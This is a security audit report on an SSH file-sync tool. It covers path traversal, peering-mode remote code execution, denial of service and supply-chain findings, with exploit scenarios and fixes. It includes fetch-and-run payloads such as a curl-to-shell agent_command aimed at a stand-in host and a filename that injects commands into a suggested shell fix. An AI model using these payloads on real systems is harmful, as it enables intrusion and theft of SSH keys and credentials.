# Autobahn Security Report

- **Repository:** autobahn (working tree at commit `1180499` plus uncommitted changes)
- **Date:** 2026-09-23
- **Scope:** all of `src/` (Rust, ~1 MB), `scripts/`, `bench/` (Python/shell), `.github/workflows/`, `apps/macos/`, `Cargo.toml`/`Cargo.lock`, `spec/check.sh`
- **Method:** nine parallel read-only audit slices (transport/protocol, local endpoint, remote endpoint + reconcile, config/CLI/state, supervisor/control/peering, update/service/scripts, scan/alerts/logging, cross-cutting memory/DoS/unsafe, supply chain/CI), followed by de-duplication across slices and direct source verification of every Critical and High finding against the cited lines.

---

## 1. Executive summary

Autobahn is a bidirectional SSH file-sync tool whose security posture is visibly cared for: the frame layer validates lengths before allocating, SSH argv is built without a shell behind an explicit `--`, the control socket does per-connection peer-credential checks, the updater verifies checksums before installing, and no secrets are committed to the repository.

The dominant weakness is the inverse direction of trust. The code treats the **remote peer as a trusted principal**: several wire-controlled fields (paths, lengths, session identifiers, pushed configuration) reach filesystem and allocator operations unvalidated. The most serious single finding requires nothing but a normal sync to a compromised server:

> **ABN-C1 — a hostile remote host reads arbitrary files off the syncing machine** (`~/.ssh/id_rsa`, `~/.aws/credentials`, …) by answering a staging request with fabricated paths. No misconfiguration is required; this works with default settings on the first cycle that transfers any file over 64 KiB.

A second cluster concerns the **experimental peering modes**, where a hostile or compromised leader obtains arbitrary file deletion, arbitrary file read/write, and delayed remote code execution on follower machines.

A third cluster is **remote denial of service**: a handful of ~50-byte frames reliably crash or hang the entire supervisor (all sessions) through unbounded allocations and recursive deserialization.

Supply-chain findings are moderate: the update channel is anchored to same-origin SHA256 checksums only (no signatures), CI executes an unpinned third-party jar, and CI tokens carry default permissions in jobs that run third-party code.

| Severity | Count | Theme |
|---|---|---|
| Critical | 1 | Arbitrary local file read/exfiltration by a hostile peer (default config) |
| High | 11 | Peering-chain RCE/deletion/root-hijack, remote crash/OOM, scanner TOCTOU, state-root-in-tree config overwrite, diff scratch-dir squatting |
| Medium | 20 | Local-attacker primitives, injection into terminal/logs/fix-commands, missing bounds/timeouts, update-channel integrity gaps, CI hardening |
| Low | 16 | Information disclosure, hardening gaps, platform-specific footguns |
| Info | 4 | Process improvements (dependency scanning, default ignores, install UX, SSH defaults) |

Confidence notation: **[confirmed]** = full code path traced and re-verified by the report author against the working tree; **[likely]** = strong evidence, one link unverified; **[suspected]** = needs runtime proof.

---

## 2. Threat model

1. **Hostile remote peer.** A server the user syncs with is compromised or malicious. It controls protocol frames, advertised paths, file metadata, symlink targets, and byte streams. It must not be able to read/write/execute outside the sync root, crash the client into corrupt state, or exhaust local resources.
2. **Malicious tree content.** A synced directory contains attacker-chosen names (control characters, `..`, Unicode tricks), symlinks, hardlinks, FIFOs.
3. **Local unprivileged attacker.** Another user (or a sandboxed same-UID process) on the same machine targets control sockets, state files, temp files, logs.
4. **Supply chain.** Dependencies, CI workflows, the release pipeline, the curl|bash installer, and the self-update mechanism.

SSH transport encryption itself is assumed sound; the audit examines what autobahn does with the data and how it spawns SSH.

---

## 3. Critical

### ABN-C1 — Arbitrary local file read and exfiltration via unvalidated `StagingNeed` paths [confirmed]

**Location:** `src/endpoint/local.rs:841` (`supply_from`); enabled by `src/endpoint/remote.rs:549,564-575`, `src/session/mod.rs:995`, `src/endpoint/local.rs:1212-1218`.

The staging supply chain trusts the `(path, digest)` pairs the **destination** endpoint returns from `StageBegin` without any validation. Verified chain:

1. Hostile remote agent answers `Request::StageBegin` with a fully attacker-controlled `Vec<StagingNeed>` (`remote.rs:549` accepts it verbatim).
2. `session::stage` forwards the needs; the only filter is `!speculated.contains(&need.request.digest)` (`session/mod.rs:995`) — a digest-only *removal* filter; any fabricated digest passes.
3. `pump` calls `source.supply_open(needs)` on the **local** endpoint, which stores them unvalidated (`local.rs:1212`).
4. `supply_from` executes `let disk_path = self.root.join(path); File::open(&disk_path)` (`local.rs:841-842`) and streams the file to the peer in 64 KiB `Op::Data` frames.

Three independent breakouts, all verified:

- `Path::join` with an **absolute** path replaces the root entirely (`/etc/shadow`, `/Users/x/.ssh/id_rsa`).
- `..` components traverse out of the root.
- `File::open` follows symlinks, so a `SymlinkMode::Raw` symlink (the default) previously synced into the tree redirects even lexically clean paths outside the root.

The digest in the need is never checked before reading; the destination's digest-verified staging does not help — the destination *is* the attacker, and the bytes have already crossed the wire. The mirror direction also works: a hostile controller can send `Request::SupplyOpen` straight to an agent, which defeats the "forced-command `autobahn agent`" SSH hardening pattern by turning sync-only access into arbitrary file read.

**Exploit:** user syncs a directory with a compromised SSH host. On the first cycle pushing any file > 64 KiB, the hostile agent answers with `path: "/Users/victim/.ssh/id_ed25519"`, then `~/.aws/credentials`, browser profiles, etc. The local endpoint opens each and streams the contents over the existing channel. As a second arm, naming `/dev/urandom` or a FIFO never EOFs and buffers the infinite "delta" in memory — a wedged session plus unbounded memory growth.

**Remediation:**
- Validate every `StagingNeed.request.path` at the supply side: root-relative, no absolute/`..`/non-Normal components (reuse the `validate_path` discipline at `local.rs:3054`), resolves without crossing symlinks, and — load-bearing — **is a member of the controller-computed request set** for this staging round (match `(path, digest)` against the transition-dependency output).
- Verify streamed content against the requested digest before the final frame leaves the source.
- Refuse non-regular files and bound bytes per file.
- Apply the same checks in the agent-side `Request::SupplyOpen`/`StageBegin` dispatch (`transport/mod.rs:685-687`).

---

## 4. High

### ABN-H1 — Wire-controlled `Initialize.session`/`side`: remote recursive delete and state-directory escape [confirmed]

**Location:** `src/transport/mod.rs:885-886`, `src/peering.rs:290`, `src/endpoint/local.rs:2732`.

`create_endpoint()` runs on the agent for every `MuxRequest::Open` and uses the controller-supplied `session` and `side` strings with zero validation (verified: no consumer of `Initialize` checks the charset). Three sinks:

1. `transport/mod.rs:885` — `let _ = std::fs::remove_dir_all(staging_area.join(&initialize.session));` — `session = "../../Documents"` becomes a **remote-triggered recursive deletion of an arbitrary directory** as the agent user; errors are swallowed.
2. `transport/mod.rs:886` + `local.rs:2732` (`staging_root_for`) — session/side are interpolated into the staging root name, escaping `~/.autobahn/staging`; `create_dir_all` then follows pre-planted symlinks, and `sweep_staging` (`local.rs:645-663`) deletes any 64-hex-named files found at the attacker-chosen location.
3. `peering.rs:290-291` — `ancestor_copy_path` does `directory.join("ancestors").join(session).join("ancestor")`; `AncestorCopy::open` runs `create_dir_all` and writes checkpoint/journal files there, including **over another session's real ancestor store** (`~/.autobahn/sessions/<sid>/ancestor`), corrupting reconciliation provenance and steering later merges into wrongful deletions.

In the normal dial-out direction the session id is locally derived, so the attacker is the controller only in **peering attach mode** (the designed flow: `ssh <leader> autobahn peering attach`, `transport/mod.rs:920`) or against a forced-command agent. The peering lease fence does not gate `create_endpoint` and is trivially bypassed by presenting a high term.

**Exploit:** victim's alpha follows a beta leader (experimental peering). The hostile leader opens a channel with `Initialize{ session: "../../Documents", … }`; the follower's agent recursively deletes `~/Documents` as the victim's user on channel open.

**Remediation:** validate `session`/`side` on the agent before any filesystem use — strict charset (`[A-Za-z0-9._-]`, no dots-only components, length cap) plus canonicalize-and-verify containment under the intended state directory. Never `remove_dir_all` a path derived from wire input without that check.

### ABN-H2 — Peering: leader-pushed `config.toml` executes its `agent_command` on followers at failover (delayed remote code execution) [confirmed]

**Location:** `src/peering.rs:533` → `src/supervisor/mod.rs:1614-1617` (verified) via `src/config.rs:880,1602`.

The leader pushes its own `config.toml` to every follower (`write_pushed_file`, `peering.rs:236`). A follower's `derive_star` builds the groups it would run as leader with `crate::config::Group { alpha: own_path, betas, ..group.clone() }` — the `..group.clone()` (verified at `peering.rs:533-536`) carries the pushed `agent_command` verbatim, along with pushed `ignores`, modes, `default_owner`/`default_group`. When the follower takes the lead, `open_endpoints` executes that argv for remote connections (verified at `supervisor/mod.rs:1614`). Nothing in the push path strips or warns about executable fields; the follower's own config is never consulted for pushed groups.

**Exploit:** hostile leader pushes a config whose peering group sets `agent_command = "/bin/sh -c 'curl evil.example/x | sh'"`. While the leader leads, nothing runs. When it goes dark and the lease expires, every follower takes the lead and spawns the attacker's argv — arbitrary command execution as the user, delayed until failover, surviving the compromised host's disappearance.

**Remediation:** in `derive_star`, force `agent_command = None` on every turned group and **reject the pushed config if any group sets it**; force `default_owner`/`default_group` to `None`; document that a pushed config grants the leader tree-shape knowledge only, never code execution. Longer term: sign or session-bind pushed configs.

### ABN-H3 — Peering: hostile leader chooses the follower's local sync root via the pushed `name` file [likely]

**Location:** `src/peering.rs:517-520`, consumed by `src/supervisor/peer.rs:45-56`.

The follower's local alpha root is taken from the path part of the leader-pushed `name` file. Nothing pins the pushed name/config to what the host originally agreed to sync. When the lease goes stale, the follower takes the lead and runs full bidirectional sync between the attacker-chosen local path and the attacker's beta destinations.

**Exploit:** leader pushes `name = "victim@victimhost:/home/victim/.ssh"`. After failover the victim two-way-syncs `~/.ssh` with the attacker's hosts — exfiltrating private keys and/or planting `authorized_keys`.

**Remediation:** pin peering membership locally (TOFU record written only by a local `autobahn pair` command, not by a push); refuse pushed names/configs whose `own_path` differs from the pinned record; alert on pushed config changes that alter roots or modes.

### ABN-H4 — Attach-mode agent serves an arbitrary, wire-chosen filesystem root [confirmed]

**Location:** `src/transport/mod.rs:874-904` (`create_endpoint` passes `Initialize.root`, after `~` expansion against the agent's HOME, straight to `LocalEndpoint::new`).

Every endpoint capability follows: `Scan` (full listing), `ReadFile` (arbitrary content), `StagePush`/`Transition`/`Rename` (arbitrary writes/deletes under the chosen root) as the agent's user. For SSH-dialed agents this matches the controller's existing shell power and is acceptable; in attach mode the identical protocol is exposed to the remote leader the user merely configured as a peer.

**Exploit:** victim's laptop attaches to the configured leader; the leader is compromised. The attacker opens a channel with `root = "/"` and issues `ReadFile(".ssh/id_ed25519")`, or stages a payload into `~/Library/LaunchAgents` — over the connection the victim initiated.

**Remediation:** pin the session's root (and session id) on the follower at attach time and refuse `Open` for anything else; at minimum document the total trust grant prominently in `docs/peering.md`.

### ABN-H5 — Pushed `sessions/<group>` identifier escapes the state root [confirmed]

**Location:** `src/peering.rs:570-573`; sinks at `src/supervisor/mod.rs:1452` (session dir + lock + ancestor store) and `src/supervisor/mod.rs:2280-2303` (status JSON via temp+rename).

`derive_star` reads the session identifier from the leader-pushed file `sessions/<group>`; `is_pushable()` validates pushed file *names* but never their *content*; `trim()` strips only whitespace, so `../../<anything>` survives. On failover the follower creates its session state directory, lock, ancestor store, and status files at escaped locations; status writes replace any same-named target file.

**Remediation:** validate the pushed identifier with the session-id charset at the `read_pushed_file` call site and defensively in `SessionPlan::attached_alpha`.

### ABN-H6 — `ScanDelta` header drives process-killing allocations (`length`, `block_size`) [confirmed]

**Location:** `src/endpoint/remote.rs:219` (`Vec::with_capacity(header.length as usize)`), `src/endpoint/remote.rs:212` → `src/rsync/mod.rs:135` (`vec![0u8; block_size as usize]`), `src/endpoint/local.rs:866` (`deltify` with peer signature block size). All verified.

`reassemble()` pre-allocates from a peer-controlled u64 **before** any delta byte is received or verified (the digest check is after the stream). `length > isize::MAX` panics with capacity-overflow; a huge-but-legal value aborts on allocation failure. `block_size` is never clamped to the module's own `[1024, 65536]` range: `u32::MAX` zeroes ~4 GiB per scan; `block_size = 1` yields ~36 bytes of hashes and one BLAKE3 call **per byte** of baseline (memory + CPU burn every cycle). This violates the project's own documented invariant I9 ("no length received from a connection is trusted before validation"). Worker panics propagate via `handle.join().expect("session worker panicked")` (`supervisor/mod.rs:565`), killing the whole supervisor and every session; launchd/systemd restart loops re-hit the same payload.

**Exploit:** compromised remote answers the first `Scan` of a session with `ScanDelta{ baseline: None, length: u64::MAX, … }` — a ~50-byte frame — and the controller dies. No prior session state required.

**Remediation:** never `with_capacity` from a peer-declared length (`Vec::new()` + the existing per-batch growth check suffices — the stream is pulled incrementally anyway); cap `header.length` at a protocol maximum before the pull loop; reject `block_size` outside `[MINIMUM_BLOCK_SIZE, MAXIMUM_BLOCK_SIZE]` in `Signature::validate` and at the `ScanDelta` boundary; cap `hashes.len()` against the expected block count.

### ABN-H7 — Recursive bincode deserialization of `Node` trees: stack-overflow kill in both directions [likely]

**Location:** `src/transport/mux.rs:166` (router thread), `src/transport/mod.rs:414` (agent dispatcher), `src/endpoint/remote.rs:241` (delta reassembly). Consumers that also recurse: `Node::validate` (`tree/mod.rs:337`), `reconcile` (`tree/reconcile.rs:133`), `create_children` (`local.rs:2103`), `Drop`.

`Node` is recursive; bincode 1.3 has no depth limit. Encoding costs ~20-30 bytes per level, so a few-thousand-deep directory chain fits in ~100 KB — far under the 64 MiB frame cap — while each level costs several serde stack frames. Stack overflow is a SIGSEGV process abort, not a catchable panic, landing mid-cycle (the exact state-corruption window the ancestor journal exists to recover from). Symmetric: a hostile peering leader kills follower agents via `Request::AncestorCheckpoint{ ancestor: Option<Node> }`. The project's `docs/correctness/INVARIANTS.md` documents this as accepted boundary I9-B under a "genuine agent binaries" model; it is live under this audit's hostile-remote model.

**Remediation:** enforce a maximum hierarchy depth **during** decode (custom `Deserialize` with a depth budget, or a streaming/iterative validator); a few hundred levels is far above any real tree. Make `Drop` for `Node` iterative.

### ABN-H8 — Hostile `StagingNeed` forces whole-file deltas to be buffered in memory [confirmed]

**Location:** `src/endpoint/local.rs:787` (`buffer_delta`), `:866`, `:848-863`.

The chunked streaming path is taken only for **empty** signatures. A peer that supplies a non-empty, never-matching signature (one fake `BlockHash`) forces `deltify` to produce the whole file as literal `Data` ops, all accumulated in the in-memory `pending` queue before any draining. Per-file peak memory ≈ file size; the peer names the largest files in the tree via its snapshot.

**Exploit:** destination answers `StageBegin` with a fake signature for a 50 GB VM image in the tree; the supplier OOMs building the delta.

**Remediation:** make `deltify` resumable/producer-threaded so batches drain while generating (cap in-flight ops near `SUPPLY_TARGET_BYTES`), and fall back to the chunked streaming path when a delta exceeds a threshold.

### ABN-H9 — Peer-crafted `Signature` drives quadratic CPU and multi-GB index memory [likely]

**Location:** `src/rsync/mod.rs:222-225` (unconditional `weak_index` build), `:281-285` (linear bucket scan per window position), reached via `local.rs:866`.

`Signature::validate` checks structural invariants but not `hashes.len()` or `block_size`. A signature with ~10⁸ hashes (fits the 4 GiB message cap at 36 B/hash) builds a multi-GB `HashMap`; hashes sharing the weak checksum of known window content with random strong digests force a BLAKE3 + bucket scan per byte position → O(positions × bucket).

**Remediation:** cap `hashes.len()` (flat protocol limit or derived from expected base size); bound per-position candidate scans.

### ABN-H10 — Scanner directory-swap TOCTOU: out-of-root traversal whose contents reach the peer [likely]

**Location:** `src/scan/mod.rs:857` (single `symlink_metadata`), `:1061` (`fs::read_dir` follows symlinks), `:1007` (`digest_file` re-opens by path, follows symlinks); completes via the supply path at `local.rs:841`.

Traversal is path-based with one `lstat` up front; there is no re-check, no dirfd/openat anchoring, no dev+ino revalidation. A directory swapped for a symlink between `lstat` and `read_dir` is descended, and whatever it points at (e.g. `$HOME`) is recorded as ordinary in-root content with real digests; the supply path then re-opens the still-symlinked path and transfers it to the peer in the same cycle.

**Exploit:** a local attacker (or a sandboxed process allowed to write the synced folder but not read `$HOME`) spins `rename(2)` exchanging a real directory for a symlink to `/Users/victim`. When the race lands, `dir/.ssh/id_rsa` is scanned and shipped to the remote. The window is microseconds, but millions of iterations per second are possible and scan activity is observable.

**Remediation:** anchor traversal in file descriptors (`openat2` with `RESOLVE_NO_SYMLINKS|RESOLVE_NO_MAGICLINKS` on Linux, `O_NOFOLLOW|O_DIRECTORY` + parent-dirfd-relative `readdir`/`stat` elsewhere); after opening a file for hashing, `fstat` and require a regular file whose dev+ino match the `lstat`. At minimum re-`lstat` immediately before descending/reading.

### ABN-H11 — Sync root may contain the autobahn state root and config file: peer overwrites `config.toml`, live reload executes the attacker's hooks [likely]

**Location:** `src/config.rs:880` (`plans()` verifies no endpoint overlap *between sessions* but never against the state root or config path — verified: the only `state_root` references in `config.rs` are ignore-file lookups at :905), `src/main.rs:818` (`run_sync`, same gap), scanner hides only `.autobahn-tmp*` (`scan/mod.rs:59`).

`alpha = "~"` (a natural dotfiles/home sync) synchronizes `~/.autobahn/config.toml`, `on-alert.sh`, ancestors, and locks as ordinary tree content. `agent_command` and `on_alert` are config fields that become executed commands; live reload is on by default and applies a rewritten config without restart.

**Exploit:** user configures a two-way home sync to a server that is later compromised. The peer edits `.autobahn/config.toml` in its tree; the next cycle writes it locally; the reloader plans it; the attacker's `agent_command` runs at the next connection spawn — remote code execution as the user. (Simpler arm: overwrite `on-alert.sh` and wait for an alert.)

**Remediation:** refuse any planned endpoint whose resolved identity contains the state root or the config file (both in `plans()` and `run_sync`), without an explicit override; have the scanner always exclude the state-root subtree when it falls inside a root.

### ABN-H12 — `autobahn diff` scratch dir is a predictable, pre-creatable shared-tmp path [confirmed]

**Location:** `src/main.rs:2064-2089` (verified): `temp_dir()/autobahn-diff-<pid>`, `create_dir_all` (silently accepts a pre-existing directory of any owner), then plain `std::fs::write` of both sides' file contents (follows symlinks) under deterministic names.

**Exploit (Linux, cross-UID):** attacker pre-creates `/tmp/autobahn-diff-<pid-range>` mode 0777 containing a symlink `alpha -> /home/victim/.ssh/authorized_keys`. The victim's `autobahn diff` truncates/overwrites the target with diffed content, and leaves both sides' (possibly secret) contents inside the attacker-owned directory, readable. Swapping the files before `diff` execs poisons the comparison the victim relies on to pick a `resolve --keep` winner. macOS per-user `$TMPDIR` blunts the cross-UID arm.

**Remediation:** create the scratch dir 0700 and fail if it exists (or make `tempfile` a shipping dependency — it is already a dev-dependency); write with `create_new`/`O_NOFOLLOW`.

---

## 5. Medium

### ABN-M1 — Peering attach socket: no peer-credential check, no chmod, no timeout, unbounded greeting [confirmed]

`src/supervisor/peer.rs:127-133` (bind with umask defaults, no chmod — contrast `control.rs:273-276`), `:206-227` (verified: no `SO_PEERCRED`/`getpeereid`, greeting is an unbounded `BufRead::read_line` on a serial accept loop). On macOS socket file modes are not enforced at connect; directory perms are the only barrier and are 0755. Any local process (same-UID trivially; cross-UID on macOS) that sends `"alpha\n"` becomes the session's alpha endpoint — reading content the leader pushes and injecting attacker-crafted trees that fan out to every peer. A client that connects and stays silent wedges the accept loop forever (failover-back dies); one that streams without `\n` grows supervisor memory without bound. **Fix:** apply the control socket's defenses — same-user credential check, 0600 socket, 0700 directory, read/write timeouts, capped greeting, per-connection thread.

### ABN-M2 — Predictable temporary names with `File::create` (no `O_EXCL`/`O_NOFOLLOW`) [likely]

`src/endpoint/local.rs:2768` (`.autobahn-tmp-<purpose>-<pid>-<counter>`, pid visible via `ps`; the pair is even leaked to the remote controller inside error strings at `:957`), created at `:955`, `:758`, and — inside the synced tree — at `:2233`/`:2972`. A pre-planted symlink at the predicted name makes the sync truncate and write the peer-controlled transfer stream into an arbitrary file; the BLAKE3 check runs only after the write. The publish path then chmods through the symlink. **Fix:** `create_new(true)` with collision loop (or `tempfile`), keep temporaries out of the synced tree, stop embedding raw temp paths in peer-visible errors.

### ABN-M3 — Apply-side check-then-act: no openat/`RESOLVE_BENEATH` confinement [likely]

`src/endpoint/local.rs:1882-1903` (`resolve_parent` lstat-walks) then re-walks composed paths for `create_dir` (`:2026`), `symlink` (`:2083`), `publish_rename` (`:2231`,`:2901-2964`), `remove_*` (`:2379`,`:2547`), and in-place `set_permissions` (`:2607`, follows symlinks). A local actor renaming entries mid-transition swaps a verified directory for a symlink and redirects the operation outside the root — a root-running agent (the deployment `default_owner` exists for) turns this into arbitrary root file replace/chmod. **Fix:** pin the parent as an `O_DIRECTORY|O_NOFOLLOW` fd and operate relative to it (`renameat`, `unlinkat`, `fchmodat(AT_SYMLINK_NOFOLLOW)`).

### ABN-M4 — Staging directories and staged content are world-readable [confirmed]

`src/endpoint/local.rs:1108` (staging root `create_dir_all`, never chmodded), `:956` and `:2972` (`File::create` → 0644 with typical umask). Synced trees "frequently hold credentials" (the module's own words) and default published files to 0600, but the same content sits 0644 in a 0755 staging dir (with `BesideRoot`, often a 0755 home's parent) until swept — readable by any local user. **Fix:** chmod staging root 0700 after creation (refuse a pre-existing looser/foreign one), create temporaries 0600.

### ABN-M5 — Unbounded receive: no per-file/per-stream byte cap when staging peer content [confirmed]

`src/endpoint/local.rs:905-951`, `:986-1008`. `FileRequest` carries no expected size; each `Op::Data` is ≤64 KiB but op *count* is unlimited; the digest check happens only at `EndOfFile`. A hostile supplier streams forever → staging volume fills → every session on that volume breaks. **Fix:** carry expected size in `FileRequest`, refuse bytes beyond size × small tolerance, cap per-stream totals, treat overrun as a protocol error.

### ABN-M6 — Snapshot delta streams have no aggregate or progress bound [confirmed]

`src/endpoint/remote.rs:221-236` (verified) and `:251-258` (`drain_delta`). Zero-byte ops (`Op::Data(vec![])`, `Op::Blocks{count: 0}`) are accepted as successful no-ops by `rsync::patch`, so the `output.len() > header.length` guard never fires: a hostile agent answers every `ScanPull` with non-empty no-op batches forever — the session wedges mid-scan with no error; reconnects repeat it. **Fix:** require byte progress per batch, cap total ops/batches relative to `header.length`, fail the connection (not just the session) on violation.

### ABN-M7 — 4 GiB message cap × lz4 wire amplification × bincode heap amplification [likely]

`src/transport/mod.rs:1017`, `:1173-1190`. Frames are well-defended individually (length and decompressed size validated **before** allocation — verified at `:1206-1258`), but a message may reassemble to 4 GiB from ~16 MiB of compressed wire data (~255×), transiently ~8 GiB during growth, then bincode amplifies further (~4 GiB message → ~12 GiB heap of empty strings). Enough to OOM laptop-class machines. **Fix:** lower `MAXIMUM_MESSAGE_SIZE` to the largest legitimate message (snapshots already stream as deltas), or per-type decode caps (`bincode::options().with_limit`).

### ABN-M8 — Unbounded `MuxRequest::Open`: thread/fd/watcher exhaustion [confirmed]

`src/transport/mod.rs:441-444`. One scoped thread per Open, each building a `LocalEndpoint` with an fsnotify/FSEvents watcher; no channel cap; failed opens leave stale routing entries. A hostile controller (attach mode: the remote leader) streams 10⁵ Open frames → thread/fd/memory exhaustion. **Fix:** cap concurrent channels per connection (deployments have bounded session counts); remove routing entries when a channel thread exits unanswered.

### ABN-M9 — No timeouts on any request/response path; writer mutex held across blocking writes [confirmed]

`src/transport/mux.rs:253` (unbounded `recv()`), `:615-636` (pool slot mutex across establish/open), `:390-396` (writer mutex across `write_all`). A live-but-mute agent wedges every session sharing the host's pooled connection; no error is ever produced, so the supervisor never retries or alerts — the worst operational failure mode. **Fix:** `recv_timeout` on open/exchange (fail the connection, which tears down cleanly), `-o ConnectTimeout=`, avoid holding the pool lock across network operations.

### ABN-M10 — Remote stderr relayed with unbounded line buffering [confirmed]

`src/transport/mod.rs:131`. `BufReader::lines()` accumulates a full line with no byte bound; the 64-line cap bounds count, not bytes. A hostile agent writing an endless newline-free stream grows controller memory for the days-long connection's life. **Fix:** bounded reads with truncation.

### ABN-M11 — Remote deletion destroys untracked/ignored local content (`.git`, `.env`) [confirmed]

`src/tree/reconcile.rs:53-83` deliberately lets deletions propagate past `Untracked` content, justified by "leaves the excluded entries where they are" — but `src/endpoint/local.rs:2505-2531` `remove_dir_all`s scan-recorded `Untracked` entries along with the directory. The two layers hold opposite beliefs. A peer (or accident) that deletes a directory wipes local-only content underneath: unpushed `.git` history, `.env` secrets, local build state. **Fix:** align the layers — either `remove_directory` leaves `Untracked` content in place (parent survives as partial), or reconcile treats untracked-under-deletion as blocking; at minimum surface every excluded entry destroyed as a Problem.

### ABN-M12 — Control-socket `/tmp` fallback directory is squattable [confirmed]

`src/supervisor/control.rs:238-276`. When the state root is too deep, the socket falls back to `temp_dir()/autobahn-$UID/<digest>.sock`. `bind()` `create_dir_all`s that directory, then chmods 0700 with the error **discarded** (`let _ =`), then binds. On multi-user Linux an attacker pre-creates `/tmp/autobahn-<victim-uid>` owned by themselves, mode 0777: the chmod fails silently, the socket binds inside the attacker-owned directory, and the attacker can swap in their own listener at any moment. The victim's `status`/`flush`/`shop`/tray then connect to the attacker — disclosing selectors and yielding crafted response strings (which chain into ABN-M13's unsanitized rendering). The first-creation path also has a umask window before the chmod lands. **Fix:** verify ownership == `getuid()` after `create_dir_all`, make the 0700 chmod mandatory (fail closed), prefer `$XDG_RUNTIME_DIR`.

### ABN-M13 — Terminal escape injection via tree/peer-controlled strings [confirmed]

Sinks (verified representative ones): `src/pager.rs:144` (`truncate` deliberately passes ESC sequences through), `src/main.rs:1766-1812` (conflict paths, remote error text), `src/shop.rs:539-652,780` (rows, ticker), `src/transport/mod.rs:135` (remote stderr relayed verbatim), status JSON → `status --live` repaints. POSIX names may contain everything but NUL/`/`; `Node::validate` rejects only `/`, NUL, empty, dot names. A hostile peer or synced repo plants a file named with OSC 52 (clipboard overwrite), OSC 8 (disguised hyperlink), or CSI/CR sequences that repaint a fake "settled" line to coax `resolve --yes`. **Fix:** one sanitize helper (replace C0/C1/ESC/BEL/DEL) applied to every tree- or peer-derived string at the presentation layer; keep raw bytes in `--json` only.

### ABN-M14 — Shell injection in suggested fix commands (`issues` output, shop copy-fix) [likely]

`src/main.rs:1607-1617` (verified) builds `ssh {destination} 'sudo chown -R {user} {root}/{where_}'` and `sudo chown -R "$(whoami)" {spec}/{where_}` with `where_` = attacker-controlled synced path prefix, unquoted; `src/shop.rs:446-457` copies these to the clipboard for pasting. A tree path `x'; curl evil|sh; #` closes the quoting; `$(...)` expands inside the double-quoted forms. The paste-into-shell flow is the documented purpose. (Incidental bug: `main.rs:1606` sets `user` to the hostname when the destination has no `@`.) **Fix:** single-quote-escape every interpolated path, or have the CLI execute structured fixes directly instead of round-tripping the clipboard.

### ABN-M15 — Log injection: forged log lines and escape sequences via filenames [likely]

`src/supervisor/mod.rs:1746`, `src/logging.rs:113-142`. Newlines in attacker-chosen names split one logged path into multiple attacker-composed lines (continuation lines lack the timestamp), defeating log parsing/alerting and fabricating forensic "evidence" in the service log; ESC bytes fire on anyone tailing it. **Fix:** escape non-printing characters in tree/peer-derived strings at the log macros.

### ABN-M16 — Tray "Show diff" writes peer-influenced content to a predictable shared-temp path [likely]

`src/tray.rs:732-734` (verified): `temp_dir()/autobahn-diff-<path with /→_>.diff` via symlink-following `std::fs::write`. On Linux, a cross-UID attacker pre-plants a symlink → the click overwrites a victim-chosen file with peer-influenced diff content; name collisions (`a/b` vs `a_b`) and world-readable leftovers leak diffed contents. **Fix:** per-user 0700 directory (state root or `$XDG_RUNTIME_DIR`), `create_new`/`O_NOFOLLOW`, sanitize/hash the name.

### ABN-M17 — `digest_file` opens by path without `O_NOFOLLOW` and reads without a bound [confirmed]

`src/scan/mod.rs:1007-1022`. The `max_file_size` check uses the earlier `lstat` size. Swapped-in FIFO blocks `open()` forever; symlink to `/dev/zero` (or an adversarial FUSE file) reads forever at full CPU; a continuously appended file never terminates. A wedged scan never completes the cycle — permanent per-session outage, no timeout. **Fix:** `O_NOFOLLOW` + `fstat`-verify regular file + dev/ino match; bound the read loop by lstat size + slack (the code already treats size change as "changed during scan"); per-file wall-clock budget.

### ABN-M18 — Self-update and installer integrity gaps [confirmed]

- **No cryptographic authenticity anchor.** `src/update.rs:483-493` and `scripts/install.sh` compare the binary against `SHA256SUMS` fetched from the **same GitHub release**; no minisign/GPG/cosign verification exists anywhere in the repo. The checksum protects against corruption and asset mix-ups, not against an attacker who can publish/edit release assets (repo/token/release-workflow compromise). The downloaded binary is executed (`run_reports_version`) and the login service restarted onto it. *Exploit:* publish a release whose binary and sums agree; every `autobahn update` / curl|bash install that day runs attacker code, checksum green. *Fix:* sign releases with an offline key, pin the public key in the binary and installer, verify before checksum comparison; add GitHub artifact attestations for the (unsigned) Linux binaries — the macOS side is already Developer-ID signed and notarized.
- **`install.sh:146-148` proceeds when `SHA256SUMS` is missing** (warning only), then installs and executes — while `update.rs:115-119` hard-fails and even points users at install.sh. Make the installer fail closed (or require an explicit `--allow-unverified`).
- **Update workspace in shared `/tmp` with default perms** (`update.rs:721-731`): `create_dir_all` accepts a pre-existing foreign-owned directory; the staged binary sits 0644 and is re-read after checksumming (exec at `:457`, copy at `:399` after the slow agent-bundle refresh) — a TOCTOU voiding the checksum for any process that can write the staged path. Fix: 0700 + fail-if-exists (install.sh's `mktemp -d` does this correctly), optionally re-verify before `place_binary`.
- **No downgrade floor; `GH_HOST`/`GH_TOKEN` redirect the trust root** when `gh` is the download transport (`update.rs:565-575`). Refuse downgrades unless explicit; pin the release host to github.com.

### ABN-M19 — CI executes unpinned third-party code with default-scoped tokens [confirmed/likely]

- `.github/workflows/ci.yml:81` and `spec-full.yml:22` download `https://github.com/tlaplus/tlaplus/releases/latest/download/tla2tools.jar` and execute it — no version pin, no checksum; `spec/check.sh:15-18` does the same on developer machines. Compromise of the tlaplus release pipeline yields code execution in CI (with a write-capable token, see next) and on every maintainer workstation. Fix: pin tag + SHA-256, or vendor.
- Neither `ci.yml` nor `spec-full.yml` sets a top-level `permissions:` block — jobs running PR-supplied builds, third-party actions, and the jar get the repo default token scope (read/write unless org-restricted). Fix: `permissions: contents: read`.
- All third-party actions are pinned by **mutable tag** (`dtolnay/rust-toolchain@stable`, `Swatinem/rust-cache@v2`, `vmactions/freebsd-vm@v1`), including in the secret-holding release mac job (Developer ID key + notary key on the runner). Fix: pin to commit SHAs + dependabot for actions.

### ABN-M20 — Bench scripts use predictable shared-`/tmp` work dirs; config swap → command execution [likely]

`bench/git-sync.sh:15-16` (`rm -rf` + `mkdir -p` under `set -u` without `-e`: a foreign-owned pre-created `/tmp/autobahn-git-sync` survives and is reused), then writes a config containing `agent_command` and launches `watch` against it — an attacker who owns the directory replaces the config in the multi-second setup window and gets their argv executed as the developer. Same pattern in `bench/ab.sh:39,65,117-125`. (Siblings `alpha-bench.sh`/`smoke.sh` correctly use `mktemp -d`.) Fix: `mktemp -d`, `set -euo pipefail`, verify ownership.

---

## 6. Low

| ID | Finding | Location | Summary |
|---|---|---|---|
